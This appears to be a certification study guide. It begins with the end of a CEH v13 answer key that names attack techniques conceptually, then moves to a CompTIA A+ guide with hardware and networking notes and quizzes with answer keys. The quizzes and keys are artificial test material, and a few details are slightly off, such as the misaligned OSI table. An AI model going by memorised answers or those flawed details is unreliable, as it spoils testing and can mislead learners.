**Q1->C.** Blind SQLi = no results visible, infer from timing (time-based) or boolean response changes.
**Q2->C.** MAC flooding fills CAM table → switch fails open → broadcasts like hub → enables sniffing.
**Q3->B.** `-O` = OS detection. `-sV` = version. `-A` = aggressive (OS + version + scripts). `-sC` = default scripts.
**Q4->C.** WPA3 uses SAE, replacing the PSK 4-way handshake vulnerable to offline dictionary attacks.
**Q5->D.** Bootkit = MBR infection, loads before OS. Kernel rootkit = in kernel but after OS loads.
**Q6->B.** `db_nmap` runs Nmap and stores results in Metasploit's database (hosts, services).
**Q7->C.** GCM (Galois/Counter Mode) = authenticated encryption used in TLS 1.3, AES-GCM.
**Q8->C.** FIN+PSH+URG = Xmas scan (lights up like a Christmas tree).
**Q9->C.** Steganography = hiding data within other data (image, audio). Different from encryption.
**Q10->B.** SSRF = server makes request to metadata endpoint on attacker's behalf.
**Q11->C.** Maltego = visual link analysis and intelligence mapping tool.
**Q12->C.** Maintaining Access = rootkits, backdoors, RATs. After gaining access and escalating.
**Q13->B.** S3 bucket data exposure = misconfiguration (bucket ACL/policy allows public access).
**Q14->C.** MD5 is broken — collision attacks demonstrated. Do not use for security.
**Q15->B.** Dynamic/behavioral analysis = run malware in sandbox, observe behavior (Cuckoo, Any.run).
**Q16->A.** DNSSEC adds digital signatures to DNS records — verifies authenticity, prevents cache poisoning.
**Q17->C.** A01 Broken Access Control = IDOR, path traversal, unauthorized data access via URL manipulation.
**Q18->B.** Deauth forces reconnect → client performs WPA2 4-way handshake → attacker captures it for offline cracking.
**Q19->C.** Unquoted service path = Windows searches path components, attacker places malicious executable earlier in path.
**Q20->B.** AI deepfake audio of CEO for vishing = AI-powered BEC/deepfake vishing attack.
**Q21->B.** Reaver = WPS brute force tool. Aircrack-ng = WPA cracking from captured handshake.
**Q22->B.** Timestomping = modifying file timestamps to hide when attacker was on the system (anti-forensics).
**Q23->C.** MQTT = Message Queuing Telemetry Transport. Default port 1883 (8883 for TLS). IoT messaging protocol.
**Q24->C.** Golden Ticket requires krbtgt account hash from DC. Forges valid TGTs valid for any service.
**Q25->B.** Port security = limits MAC addresses per switch port → prevents MAC flooding.
**Q26->B.** DDoS = Distributed: multiple attackers/bots targeting one victim simultaneously.
**Q27->C.** EV (Extended Validation) = organization name visible in browser, requires extensive verification.
**Q28->C.** Ping of Death = oversized ICMP packet (>65,535 bytes) causing buffer overflow on older systems.
**Q29->B.** NULL scan = no flags. Closed ports respond RST. May bypass firewalls checking for SYN.
**Q30->B.** After gaining access → Privilege Escalation (user → admin). Then maintaining access, then covering tracks.
**Q31->A.** BlueSnarfing = unauthorized access to data (contacts, messages). BlueJacking = send unsolicited messages.
**Q32->C.** XXE = XML External Entity injection = read server files, SSRF via XML parser.
**Q33->B.** No direct contact with target = passive reconnaissance (OSINT).
**Q34->B.** enum4linux = comprehensive Linux tool for SMB/Windows enumeration (users, shares, policies).
**Q35->B.** `document.cookie` in XSS payload = steals session cookies.
**Q36->C.** WEP = completely broken. Never use. Statistical attack cracks it in minutes.
**Q37->B.** MS17-010 = EternalBlue = SMB vulnerability exploited by WannaCry/NotPetya.
**Q38->C.** RSA = based on difficulty of factoring large integers (product of two large primes).
**Q39->C.** DNS amplification = small query → large response to spoofed victim IP = volumetric DDoS.
**Q40->C.** Reporting = final phase. Formal document with findings, evidence, risk ratings, recommendations.
**Q41->C.** Security Event Log = logs logon events, privilege use, object access (security-relevant events).
**Q42->B.** Hardcoded keys in environment variables = accessible via function configuration = unauthorized access risk.
**Q43->C.** Pivoting = using a compromised host to reach otherwise inaccessible systems/networks.
**Q44->A.** Birthday attack = find collision (two inputs with same hash). Named after birthday paradox.
**Q45->C.** IDLE/Zombie scan = attacker's IP never appears in logs. Uses zombie host as intermediary.
**Q46->B.** Log poisoning via User-Agent injection + LFI to include log = RCE chain.
**Q47->B.** Polymorphic = changes signature each infection, bypasses signature-based AV.
**Q48->B.** ECB mode = same plaintext → same ciphertext → reveals patterns (famous ECB penguin image).
**Q49->C.** HTTP CONNECT proxy open = attacker uses server to tunnel connections to other hosts.
**Q50->B.** `post/multi/recon/local_exploit_suggester` = finds local PrivEsc exploits from Meterpreter session.

## CEH v13 Exam Tips

1. **Know tools by category** — the exam asks "which tool does X" constantly. Map tools to their categories.
2. **Know attack names exactly** — CEH uses precise terminology. "MAC flooding" not "switch attack."
3. **Know the 20 modules broadly** — don't deep-dive one area; 125 questions span all modules.
4. **Variable passing score** — aim for 85%+ on practice exams. The actual cut score varies 60–85%.
5. **OWASP Top 10 is tested** — know all 10 categories and what falls under each.
6. **New v13 AI content** — know deepfakes, AI phishing, adversarial ML attacks.
7. **Kerberos attacks** — Golden Ticket, Silver Ticket, Pass-the-Ticket, Pass-the-Hash are all tested.
8. **Cloud attacks** — SSRF to metadata, S3 misconfigurations, container escapes.
9. **Cryptography** — know what's broken (MD5, WEP, RC4, DES), what's current, what modes do what.
10. **Ethics and ROE** — written authorization before any testing; without it = criminal activity.

# CompTIA A+ 220-1201 / 220-1202

> Always verify current exam details at comptia.org before booking your exams.

<div style="page-break-after: always;"></div>

# Preface

## What CompTIA A+ is

A+ is the IT industry's entry-level certification proving you can install, configure, troubleshoot, and secure end-user hardware and software. It's the most recognized IT support credential in the world. Employers in help desk, desktop support, field service, and managed services use it as a baseline requirement.

The 2025 update (220-1201/1202 series) reflects modern IT realities: hybrid cloud environments, AI tools at the help desk, expanded cybersecurity, and the reality that IT support now includes supporting people on laptops in Tokyo coffee shops and phones in Bangkok co-working spaces.

## Two exams — both required

You must **pass both exams** to earn A+. You can take them in any order, but Core 1 (hardware/networking) before Core 2 (OS/security) is the standard path because the knowledge builds.

You must pass both from the **same version** (220-1201 + 220-1202 together). Cannot mix versions.

## Exam facts

| | Core 1 (220-1201) | Core 2 (220-1202) |
|---|---|---|
| Questions | Up to 90 | Up to 90 |
| Time | 90 minutes | 90 minutes |
| Passing score | 675 / 900 | 700 / 900 |
| Question types | MCQ + PBQ | MCQ + PBQ |
| Cost | $265 USD | $265 USD |
| Validity | 3 years | 3 years |
| Guessing penalty | None | None |

## Domain weights

**Core 1 (220-1201):**
| Domain | Weight |
|---|---|
| 1. Mobile Devices | 15% |
| 2. Networking | 20% |
| 3. Hardware | 25% |
| 4. Virtualization and Cloud Computing | 11% |
| 5. Hardware and Network Troubleshooting | 29% |

**Core 2 (220-1202):**
| Domain | Weight |
|---|---|
| 1. Operating Systems | 31% |
| 2. Security | 25% |
| 3. Software Troubleshooting | 22% |
| 4. Operational Procedures | 22% |

## Study plan

**8-week plan (both exams):**
- Week 1: Core 1 — Mobile Devices + Networking
- Week 2: Core 1 — Hardware
- Week 3: Core 1 — Virtualization + Cloud + Troubleshooting
- Week 4: Core 1 mock exams + review + book Core 1 exam
- Week 5: Core 2 — Operating Systems
- Week 6: Core 2 — Security + Software Troubleshooting
- Week 7: Core 2 — Operational Procedures + mock exams
- Week 8: Review wrong answers + book Core 2 exam

> **A+ mindset:** A+ tests what an IT support technician DOES, not just what they know. When reading questions, ask "What would I actually DO to fix this?" Scenario-based thinking beats memorization.

<div style="page-break-after: always;"></div>

# CORE 1 (220-1201)

# Core 1 — Domain 1: Mobile Devices (15%)

## 1.1 Laptop Hardware

### Internal components you must know

**RAM (Memory):**
- Laptops use **SO-DIMM** (Small Outline DIMM) — smaller than desktop DIMMs
- Current standard: **DDR5** (also DDR4 still common)
- Many modern ultrabooks have RAM **soldered to motherboard** — not upgradeable

**Storage:**
- **NVMe SSD (M.2 form factor)** — fastest, uses PCIe lanes. M.2 slot with "M" key.
- **SATA SSD (M.2 or 2.5")** — slower than NVMe, uses SATA interface. M.2 slot with "B" or "B+M" key.
- **2.5" SATA HDD/SSD** — traditional form factor for laptops. Less common in new models.
- eMMC — soldered flash storage in budget devices. Not upgradeable.

**CPU/GPU:**
- Most laptops have **integrated GPU** (built into CPU — Intel UHD, AMD Radeon)
- Gaming/workstation laptops may have **discrete GPU** (separate GPU chip — NVIDIA, AMD Radeon)
- Thermal paste between CPU and heat sink should be replaced periodically

**Batteries:**
- Most modern laptops: **lithium-ion (Li-Ion)** or **lithium polymer (Li-Po)**
- Li-Po is lighter and can be shaped flexibly (thin laptops)
- Battery health degrades over charge cycles — replacement when capacity drops below ~80%

**Display components:**
- **LCD types:**
  - **TN (Twisted Nematic)** — fast response, poor viewing angles, lower quality. Gaming monitors.
  - **IPS (In-Plane Switching)** — good color, wide viewing angles, slightly slower response.
  - **VA (Vertical Alignment)** — high contrast ratio, decent colors, between TN and IPS.
  - **OLED** — emissive (each pixel lights itself), perfect blacks, risk of burn-in. Premium laptops.
- Backlight: most LCDs use **LED backlighting**. Older ones used CCFL (fluorescent).
- **Inverter** — on CCFL-backlit screens, converts DC to AC for the CCFL lamp. Failure = dim/no backlight.
- **Wi-Fi antenna** — wires routed through display bezel to wireless card in laptop body.

### Laptop display issues and symptoms

| Symptom | Likely cause |
|---|---|
| Dim display, external monitor works | Inverter failure (CCFL) or backlight failure (LED) |
| No display, backlight visible with flashlight | LCD panel or LCD cable failure |
| Lines/artifacts on screen | GPU failure or damaged LCD cable |
| Display works with lid half-open only | Damaged LCD cable, lid hinge |
| Bright spot / dead pixel | LCD damage |

### Keyboard and input

- **Laptop keyboard** — ribbon cable connector to motherboard. Common failure point.
- **Digitizer** — touch-sensitive layer on top of display for touch input. Separate from LCD.
- **Touchpad / trackpad** — built-in mouse. Common failure: incorrect sensitivity settings, or driver issue before hardware failure.
- **Biometric reader** — fingerprint scanner, IR camera (Windows Hello)

### Expansion ports

| Port | Data rate | Notes |
|---|---|---|
| USB 3.2 Gen 1 (USB 3.0) | 5 Gbps | Blue connector |
| USB 3.2 Gen 2 | 10 Gbps | Also 10 Gbps versions with Type-A or Type-C |
| USB 4.0 / Thunderbolt 4 | 40 Gbps | Type-C only, supports DisplayPort + PCIe |
| Thunderbolt 3/4 | 40 Gbps | USB-C connector, lightning bolt icon |
| HDMI | Video out | Common on laptops |
| DisplayPort | Video out | DP Alt Mode via USB-C |
| SD Card slot | Storage expansion | Common on content creator laptops |

> **Exam Tip:** USB 3.x = blue color coding. USB-C doesn't specify speed by itself — check the Thunderbolt logo or data rate spec. Thunderbolt = lightning bolt icon.

## 1.2 Mobile Device Types and Features

### Smartphone and tablet connectivity

**Cellular technologies:**

| Generation | Max speed | Notes |
|---|---|---|
| 3G | ~7 Mbps | Legacy; being shut down in many countries |
| 4G LTE | ~150 Mbps typ | Current standard for most devices |
| 5G | ~1 Gbps+ | Sub-6 GHz (wide coverage) and mmWave (ultra-fast, short range) |

**Wireless standards (Wi-Fi):**

| Standard | Name | Max speed | Frequency |
|---|---|---|---|
| 802.11a | Wi-Fi 1 | 54 Mbps | 5 GHz |
| 802.11b | Wi-Fi 2 | 11 Mbps | 2.4 GHz |
| 802.11g | Wi-Fi 3 | 54 Mbps | 2.4 GHz |
| 802.11n | Wi-Fi 4 | 600 Mbps | 2.4/5 GHz |
| 802.11ac | Wi-Fi 5 | 3.5 Gbps | 5 GHz |
| 802.11ax | Wi-Fi 6/6E | 9.6 Gbps | 2.4/5/6 GHz |
| 802.11be | Wi-Fi 7 | 46 Gbps | 2.4/5/6 GHz |

> **Quick memory trick:** b/g/n = 2.4 GHz (except a = 5 GHz). 802.11n+ supports both.

**Bluetooth:** Short-range (typically 10m/100m class-dependent). Versions 4.0 (BLE = Bluetooth Low Energy), 5.0 (longer range, faster). Common uses: headphones, keyboards, mice, IoT.

**NFC (Near Field Communication):** Very short range (~4cm). Used for: contactless payment (Apple Pay, Google Pay), access cards, device pairing. Passive tags don't need power.

**Infrared (IR):** Line-of-sight only. Used for: TV/device remotes. Mostly legacy on phones.

**GPS:** Receives signals from GPS satellites (one-way receive only). Used for: location services, navigation. Assisted GPS (A-GPS) uses cellular/Wi-Fi data to speed up fix.

### Mobile OS concepts

**Android:**
- Open source (Google). Runs on devices from many manufacturers.
- App source: Google Play Store. Side-loading APKs possible (security risk).
- File system accessible via USB.
- **Developer options** → enable USB debugging.
- Android updates depend on manufacturer (varies; Google Pixel gets fastest).

**iOS/iPadOS:**
- Closed ecosystem (Apple only).
- App source: Apple App Store only (no side-loading without enterprise profile or jailbreak).
- **Jailbreaking** — removes iOS security restrictions (voids warranty, security risk).
- Backups: iCloud or local via Finder/iTunes.
- AirDrop: peer-to-peer file sharing over Wi-Fi + Bluetooth.
- Handoff/Continuity: seamless task handover between Apple devices.

### Mobile device management concepts for A+

**MDM (Mobile Device Management):** Centrally manage mobile devices in a corporate environment. Can enforce: PIN/passcode, encryption, remote wipe, app management.

**Remote wipe:** Erase all data on a lost/stolen device remotely. Important: configure before the device is lost.

**Locator apps:** Find My (Apple), Find My Device (Android) — GPS tracking of lost device.

**App store concepts:**
- Corporate app store: internal enterprise app distribution
- Sideloading: installing apps outside the official app store (Android: enabled in settings; iOS: requires enterprise profile)

## Core 1 — Domain 1 Mini Quiz (8 questions)

**Q1.** A laptop is showing a dim display even at full brightness settings. An external monitor works fine. What is the MOST likely cause?

- A. Damaged LCD panel
- B. Failed GPU
- C. Backlight or inverter failure
- D. Faulty HDMI cable

**Q2.** Which form factor does modern NVMe SSDs typically use in laptops?

- A. 3.5" SATA
- B. 2.5" SATA
- C. M.2 PCIe
- D. mSATA

**Q3.** Which wireless standard operates ONLY on 5 GHz?

- A. 802.11n
- B. 802.11b
- C. 802.11g
- D. 802.11a

**Q4.** A user wants to make contactless payments with their phone. Which wireless technology enables this?

- A. Bluetooth
- B. Wi-Fi
- C. NFC
- D. GPS

**Q5.** What is the correct name for the laptop RAM form factor?

- A. DIMM
- B. SO-DIMM
- C. RDIMM
- D. MicroDIMM

**Q6.** A company needs to remotely erase data from a lost employee phone. What MDM capability should have been configured beforehand?

- A. App management
- B. Remote wipe
- C. Geofencing
- D. Screen time limits

**Q7.** Which display technology has each pixel produce its own light, resulting in perfect black levels?

- A. IPS LCD
- B. TN LCD
- C. VA LCD
- D. OLED

**Q8.** On Android, what must be enabled to allow USB debugging for development purposes?

- A. Root access
- B. USB tethering
- C. Developer options
- D. ADB mode in settings app

### Domain 1 Answers

**Q1 -> C.** External monitor works = GPU is fine, LCD panel could be fine too. Backlight/inverter = dim internal display with external working.
**Q2 -> C.** Modern NVMe SSDs use M.2 PCIe form factor.
**Q3 -> D.** 802.11a = 5 GHz only. 802.11n and newer support both bands.
**Q4 -> C.** NFC = contactless payments (Apple Pay, Google Pay). Very short range.
**Q5 -> B.** SO-DIMM = laptop RAM. DIMM = desktop RAM.
**Q6 -> B.** Remote wipe must be set up (MDM enrolled) before the device is lost.
**Q7 -> D.** OLED = each pixel is its own light source. Perfect blacks because off pixels emit no light.
**Q8 -> C.** Android Developer Options must be enabled first (tap Build Number 7 times in About Phone).

<div style="page-break-after: always;"></div>

# Core 1 — Domain 2: Networking (20%)

## 2.1 TCP/IP Fundamentals

### The OSI Model (memorize all 7 layers)

| Layer | Number | Name | Protocols / Devices |
|---|---|---|---|
| Layer 7 | Application | HTTP, HTTPS, FTP, DNS, SMTP, POP3, IMAP, DHCP |
| Layer 6 | Presentation | SSL/TLS, encryption, encoding formats |
| Layer 5 | Session | NetBIOS, SMB session establishment |
| Layer 4 | Transport | TCP, UDP |
| Layer 3 | Network | IP, ICMP, routing; Routers |
| Layer 2 | Data Link | MAC addresses, Ethernet frames; Switches, NICs |
| Layer 1 | Physical | Cables, hubs, repeaters, bits |

**Memory tip:** "Please Do Not Throw Sausage Pizza Away" (Physical, Data Link, Network, Transport, Session, Presentation, Application)

### TCP vs UDP

| | TCP | UDP |
|---|---|---|
| Connection | Connection-oriented (3-way handshake) | Connectionless |
| Reliability | Guaranteed delivery, retransmits lost packets | No guarantee |
| Order | In-order delivery | Not guaranteed |
| Speed | Slower (overhead) | Faster (less overhead) |
| Use case | Web (HTTP/S), email, file transfer | DNS, streaming, VoIP, gaming |

**TCP 3-way handshake:** SYN → SYN-ACK → ACK. Establishes connection before data transfer.

### IPv4 addressing

**IPv4 address:** 32-bit, written as four octets (e.g., 192.168.1.1). Each octet = 0–255.

**Subnet mask:** Defines network vs host portion.
- /24 = 255.255.255.0 (256 addresses, 254 usable)
- /16 = 255.255.0.0 (65,536 addresses)
- /8 = 255.0.0.0 (16 million addresses)

**Private IP ranges (not routable on internet):**
- 10.0.0.0 – 10.255.255.255 (/8)
- 172.16.0.0 – 172.31.255.255 (/12)
- 192.168.0.0 – 192.168.255.255 (/16)

**APIPA (Automatic Private IP Addressing):** 169.254.x.x range. Windows assigns this when DHCP is unavailable. Seeing 169.254.x.x = DHCP failure.

**Loopback:** 127.0.0.1 — device communicates with itself. "Localhost."

**Broadcast:** 255.255.255.255 (limited broadcast) or x.x.x.255 (subnet broadcast).

### IPv6

**IPv6:** 128-bit addresses. Written in hex with colons (e.g., 2001:0db8::1).
- **::** = one or more groups of zeros (abbreviated)
- **::1** = loopback (equivalent to 127.0.0.1)
- **fe80::/10** = link-local (non-routable, like APIPA for IPv6)
- **Advantages:** Vastly larger address space, built-in IPSec support, no NAT needed

## 2.2 Common Ports and Protocols

Know these cold — they appear heavily on A+:

| Port | Protocol | Service |
|---|---|---|
| 20/21 | TCP | FTP (20=data, 21=control) |
| 22 | TCP | SSH (secure remote shell) |
| 23 | TCP | Telnet (insecure, legacy) |
| 25 | TCP | SMTP (send email) |
| 53 | UDP/TCP | DNS (domain name resolution) |
| 67/68 | UDP | DHCP (67=server, 68=client) |
| 80 | TCP | HTTP (web) |
| 110 | TCP | POP3 (receive email, downloads to client) |
| 143 | TCP | IMAP (receive email, stays on server) |
| 443 | TCP | HTTPS (secure web) |
| 445 | TCP | SMB (Windows file sharing) |
| 3389 | TCP | RDP (Remote Desktop Protocol) |
| 137–139 | UDP/TCP | NetBIOS (legacy Windows name resolution) |

> **Exam Tip:** SMTP = 25 (send). POP3 = 110 (downloads, deletes from server). IMAP = 143 (syncs, stays on server). SSH = 22 (secure); Telnet = 23 (insecure). RDP = 3389.

## 2.3 Network Devices

**Hub** — Layer 1. Broadcasts all traffic to all ports. Deprecated. Creates collision domain.

**Switch** — Layer 2. Learns MAC addresses, forwards frames only to the correct port. More efficient than hub. Each port is its own collision domain.

**Router** — Layer 3. Connects different networks, routes packets based on IP addresses. Uses routing table.

**Wireless Access Point (WAP/AP)** — Layer 2 device that bridges wireless and wired networks. Must be connected to a switch or router.

**Firewall** — Layer 3/4 (or Layer 7 for NGFW). Filters traffic based on rules.

**Modem** — Modulates/demodulates signal for internet connection type (DSL, cable, fiber). "Modulator-demodulator."

**SOHO Router** — home/small office device that combines: router + switch + WAP + basic firewall + DHCP server + NAT.

**PoE (Power over Ethernet)** — delivers electrical power over Ethernet cable. Used for: VoIP phones, IP cameras, WAPs. PoE = 802.3af (15.4W), PoE+ = 802.3at (30W), PoE++ = 802.3bt (60–100W).

**Network Interface Card (NIC)** — adapter in PC that connects to network. Has a MAC address burned in (though it can be spoofed).

## 2.4 Network Cables and Connectors

### Copper cables

**UTP (Unshielded Twisted Pair)** — most common. Twisted pairs reduce electromagnetic interference.

| Category | Max speed | Max length | Use |
|---|---|---|---|
| Cat 5 | 100 Mbps | 100 m | Legacy (obsolete) |
| Cat 5e | 1 Gbps | 100 m | Common for home/office |
| Cat 6 | 1 Gbps (10 Gbps up to 55m) | 100 m | Current standard |
| Cat 6a | 10 Gbps | 100 m | Future-proof, thicker |
| Cat 7/8 | 10–40 Gbps | 100 m / shorter | Data centers |

**STP (Shielded Twisted Pair)** — has metallic shield around pairs. Better EMI resistance.

**Connectors:**
- **RJ-45** — standard Ethernet connector (8-pin). Used with Cat 5e/6/6a.
- **RJ-11** — telephone connector (6-pin, 2 typically used). Narrower than RJ-45.
- **F-connector** — coaxial cable connector (TV cable, cable internet).
- **DB-9 / DE-9** — serial port connector. 9-pin D-shaped.

**Coaxial cable:**
- **RG-59** — older, lower quality, used for short cable TV runs
- **RG-6** — current standard for cable TV and internet

**Wiring standards:**
- **T568A** and **T568B** — two different pin arrangements for RJ-45. Either is correct on its own; both ends of a cable must match.
- **Straight-through cable** — both ends same standard (T568A-T568A or T568B-T568B). Connects different device types (PC to switch).
- **Crossover cable** — one end T568A, other T568B. Connects same device types (PC to PC). Mostly obsolete with Auto-MDI/MDIX on modern switches.

### Fiber optic cables

**Single-mode fiber (SMF)** — very small core (8–10 μm). One light path. Used for long distances (up to 100 km+). Yellow jacket. More expensive.

**Multi-mode fiber (MMF)** — larger core (50–62.5 μm). Multiple light paths. Shorter distances (up to ~550 m at 10 Gbps). Orange or aqua jacket.

**Fiber connectors:**
- **SC (Subscriber/Square Connector)** — square push-pull. Common in data centers.
- **ST (Straight Tip)** — bayonet twist-lock. Older.
- **LC (Lucent Connector)** — small form factor, very common now.
- **FC** — screw-type, used in telecoms.

> **Exam Tip:** LC = most common modern fiber connector. SC = older but still common. Single-mode = yellow, long distance. Multi-mode = orange or aqua, shorter distance.

## 2.5 DNS, DHCP, and Network Services

### DNS (Domain Name System)

Translates human-readable domain names to IP addresses. Port 53.

**DNS record types:**
- **A** — maps hostname to IPv4 address (e.g., www.example.com → 93.184.216.34)
- **AAAA** — maps hostname to IPv6 address
- **CNAME** — alias for another hostname
- **MX** — mail exchange record (points to mail server for a domain)
- **PTR** — reverse lookup (IP → hostname)
- **TXT** — text records (SPF, DKIM, domain verification)
- **NS** — nameserver record (identifies DNS servers for a domain)
- **SOA** — Start of Authority record

**DNS resolution process:**
1. Check local DNS cache
2. Check hosts file (/etc/hosts or C:\Windows\System32\drivers\etc\hosts)
3. Query configured DNS server (usually ISP or corporate DNS)
4. Recursive lookup if needed (root → TLD → authoritative server)

### DHCP (Dynamic Host Configuration Protocol)

Automatically assigns IP addresses, subnet masks, gateways, and DNS servers to devices. Port 67 (server), 68 (client). **DORA process:**

**D**iscover → **O**ffer → **R**equest → **A**cknowledge

DHCP lease: the IP assignment has an expiration time. Client renews before expiry.

**DHCP reservation/static DHCP assignment** — DHCP server always assigns the same IP to a specific MAC address. Useful for servers and printers.

**Scope** — the range of IP addresses a DHCP server can assign.

**DHCP exclusion** — IP addresses within the scope that the DHCP server will NOT assign (reserved for static devices).

### Network troubleshooting tools (commands)

| Tool | Use |
|---|---|
| `ipconfig` (Windows) | View IP address, subnet mask, gateway, DNS. `ipconfig /all` = detailed. `ipconfig /release` and `ipconfig /renew` = release and get new DHCP lease |
| `ifconfig` / `ip addr` (Linux/Mac) | View/configure network interfaces |
| `ping` | Test connectivity to another host (ICMP echo) |
| `traceroute` (Linux/Mac) / `tracert` (Windows) | Show hops between source and destination |
| `nslookup` | Query DNS records |
| `netstat` | Show active network connections and listening ports |
| `arp -a` | Display ARP cache (IP to MAC mappings) |
| `route print` (Windows) | Display routing table |
| `nmap` | Network scanner (port scan, OS detection) |
| `pathping` | Windows: combines ping + tracert |
| `net` | Windows command for network shares, users, services |

## 2.6 Wireless Networking

### Wi-Fi security protocols

**WEP** — BROKEN. Do not use. Easily cracked.
**WPA** — uses TKIP. Deprecated. Vulnerable to attacks.
**WPA2** — uses AES-CCMP. Current standard for most deployments. Two modes:
- Personal (PSK) — pre-shared key (passphrase)
- Enterprise — uses RADIUS server for individual authentication (802.1X)
**WPA3** — current best standard. Uses SAE (replaces PSK). Resistant to offline dictionary attacks.

**802.1X** — network access control framework. Used with WPA2/WPA3 Enterprise. Authenticates individual users via RADIUS.

**SSID** — Service Set Identifier. Network name. Can be hidden (network doesn't broadcast name) but hiding provides minimal security.

**BSSID** — Basic SSID. The MAC address of the access point.

### Wi-Fi channels

**2.4 GHz:** Channels 1–14 (US: 1–11). Non-overlapping channels: **1, 6, 11**. Range: ~45m indoor.
**5 GHz:** Many channels, non-overlapping. Less range (~30m), but less interference. Higher throughput.
**6 GHz:** Wi-Fi 6E and Wi-Fi 7 use this band. Even less interference, more capacity.

**Channel width:** 20 MHz (stable), 40 MHz (more throughput), 80/160 MHz (Wi-Fi 5/6 maximum throughput).

> **Exam Tip:** 2.4 GHz = longer range, more interference (Bluetooth, microwaves, neighbors). 5 GHz = faster, less range, less interference. Non-overlapping 2.4 GHz channels: **1, 6, 11**.

### Core 1 Domain 2 Mini Quiz (10 questions)

**Q1.** A Windows computer shows an IP address of 169.254.5.10. What is the MOST likely cause?

- A. Static IP configured incorrectly
- B. DHCP server not available (APIPA assigned)
- C. IPv6 conflict
- D. DNS failure

**Q2.** Which port does SSH use?

- A. 23
- B. 443
- C. 22
- D. 3389

**Q3.** Which cable category supports 10 Gbps for the FULL 100-meter run?

- A. Cat 5e
- B. Cat 6
- C. Cat 6a
- D. Cat 7 only

**Q4.** Which DNS record type maps a hostname to an IPv4 address?

- A. AAAA
- B. MX
- C. CNAME
- D. A

**Q5.** A network technician is connecting a new PC to a network switch. What cable type should be used?

- A. Crossover cable
- B. Coaxial cable
- C. Straight-through cable
- D. Rollover cable

**Q6.** Which wireless security protocol uses AES and is considered the current enterprise standard?

- A. WEP
- B. WPA (TKIP)
- C. WPA2-Enterprise (AES)
- D. WPA3 (SAE)

**Q7.** To release and renew a DHCP lease on Windows, which commands should be run?

- A. ipconfig /flush then ipconfig /refresh
- B. ipconfig /release then ipconfig /renew
- C. netstat -r then net reset
- D. arp -d then arp -n

**Q8.** Which fiber optic cable type is used for LONG-distance runs and has a YELLOW jacket?

- A. Multi-mode (MMF) - orange
- B. Multi-mode (MMF) - aqua
- C. Single-mode (SMF) - yellow
- D. Cat 6a fiber

**Q9.** What is the DORA process associated with?

- A. DNS resolution
- B. DHCP IP address assignment
- C. IPSec key exchange
- D. TLS handshake

**Q10.** The non-overlapping channels for 2.4 GHz Wi-Fi in the US are:

- A. 1, 2, 3
- B. 1, 6, 11
- C. 1, 5, 10
- D. 4, 8, 12

### Domain 2 Answers

**Q1 -> B.** 169.254.x.x = APIPA = DHCP server unreachable. Check DHCP server and network connectivity.
**Q2 -> C.** SSH = 22. Telnet = 23. HTTPS = 443. RDP = 3389.
**Q3 -> C.** Cat 6a supports 10 Gbps for the full 100m run. Cat 6 supports 10 Gbps only up to 55m.
**Q4 -> D.** A record = IPv4 address. AAAA = IPv6. MX = mail. CNAME = alias.
**Q5 -> C.** Straight-through cable = connects different device types (PC to switch). Crossover = same types.
**Q6 -> C.** WPA2-Enterprise with AES = current enterprise standard. WPA3 (SAE) is newer/better but WPA2 is still "current standard" on most A+ objectives.
**Q7 -> B.** `ipconfig /release` then `ipconfig /renew` = releases old lease, gets new DHCP assignment.
**Q8 -> C.** Single-mode = yellow jacket, long distance. Multi-mode = orange or aqua, shorter distance.
**Q9 -> B.** DHCP DORA: Discover → Offer → Request → Acknowledge.
**Q10 -> B.** 1, 6, 11 = non-overlapping 2.4 GHz channels (20 MHz wide channels don't overlap each other).

<div style="page-break-after: always;"></div>

# Core 1 — Domain 3: Hardware (25%)

## 3.1 PC Components

### Motherboard form factors
| Form Factor | Size | Use |
|---|---|---|
| ATX | 305×244mm | Full desktop tower, standard |
| Micro-ATX | 244×244mm | Compact desktop |
| Mini-ITX | 170×170mm | Small form factor builds |
| E-ATX | Larger than ATX | Workstations, enthusiast |

**Motherboard key components:**
- **CPU socket** — ZIF (Zero Insertion Force) for Intel/AMD. Must match CPU generation.
- **RAM slots** — DDR4 or DDR5, dual-channel requires matched pairs in correct slots.
- **PCIe slots** — x16 (GPU), x4, x1 (NIC, sound, SSD).
- **SATA ports** — connects HDDs, SSDs, optical drives.
- **M.2 slot** — compact slot for NVMe SSDs (PCIe) or SATA SSDs.
- **Chipset** — coordinates communication between CPU, RAM, storage, PCIe.
- **BIOS/UEFI chip** — firmware that initializes hardware and boots OS.

### CPU concepts
- **Cores** — independent processing units. More cores = better multitasking.
- **Threads** — logical processors per core. Hyper-Threading (Intel) / SMT (AMD) = 2 threads per core.
- **Clock speed (GHz)** — cycles per second. Higher = faster per core.
- **Cache** — L1 (fastest, smallest, per core), L2 (per core), L3 (shared, largest).
- **TDP (Thermal Design Power)** — watts of heat generated. Higher TDP = needs better cooling.
- **CPU coolers:** Air cooler (heatsink + fan), AIO liquid cooler, custom water loop.
- **Thermal paste** — fills microscopic gaps between CPU and heatsink for better heat transfer.

### RAM
- **DDR4** — current standard for most systems. 2133–5333 MHz typical.
- **DDR5** — newer standard, faster, higher density. Not compatible with DDR4 slots.
- **SO-DIMM** — laptop RAM form factor (smaller).
- **DIMM** — desktop RAM form factor.
- **ECC (Error-Correcting Code)** — detects and corrects memory errors. Used in servers.
- **Dual channel** — two matching sticks in correct slots doubles memory bandwidth.

> **Common Trap:** DDR4 and DDR5 are physically incompatible — different notch position. Cannot mix.

### Storage devices

**HDD (Hard Disk Drive):**
- Spinning magnetic platters. Slower reads/writes than SSD.
- 5400 RPM (laptop/NAS) or 7200 RPM (desktop performance).
- Larger capacity per dollar. Good for bulk storage.
- Sensitive to physical shock (spinning media).

**SSD (Solid State Drive):**
- No moving parts. Flash memory.
- Much faster than HDD. More durable.
- **SATA SSD** — connects via SATA. Max ~550 MB/s.
- **NVMe SSD (M.2 PCIe)** — much faster (3,000–7,000 MB/s). Connects via M.2 slot over PCIe.
- **M.2 slot** — can accept EITHER SATA or NVMe — check motherboard specs.

**Optical drives:** DVD (4.7 GB), Blu-ray (25/50 GB). Being phased out of most builds.

**Flash storage:** USB drives, SD cards (SDXC, microSD). Use in cameras, tablets, SBCs.

### Power supply (PSU)
- **Wattage** — total power budget. GPU is biggest consumer. Overcalculate by 20%.
- **Modular** — detachable cables reduce clutter.
- **80 Plus rating** — efficiency certification (80+, Bronze, Silver, Gold, Platinum, Titanium).
- **Form factors:** ATX, SFX (small form factor).
- **Connectors:** 24-pin motherboard, 8-pin CPU, PCIe 6+2 pin (GPU), SATA power, Molex.

### GPU (Graphics Processing Unit)
- **Dedicated GPU** — separate card in PCIe x16 slot. Required for gaming, ML, video editing.
